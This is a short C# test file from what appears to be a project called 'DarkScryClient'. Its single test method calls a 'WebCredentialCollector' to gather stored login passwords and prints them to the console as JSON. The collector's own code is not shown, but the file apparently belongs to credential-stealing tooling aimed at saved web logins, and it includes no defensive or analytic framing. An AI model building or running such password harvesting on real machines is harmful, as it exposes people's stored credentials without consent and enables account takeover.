using System;
using System.Text.Json;
using WebInfoGather;

namespace DarkScryClient.tests
{
	internal class test_web_gather
	{
		static void run_test()
		{
			var ld = WebCredentialCollector.GatherLoginData(WebCredentialCollector.CollectionType.Passwords);
			Console.WriteLine(JsonSerializer.Serialize(ld));
		}
	}
}
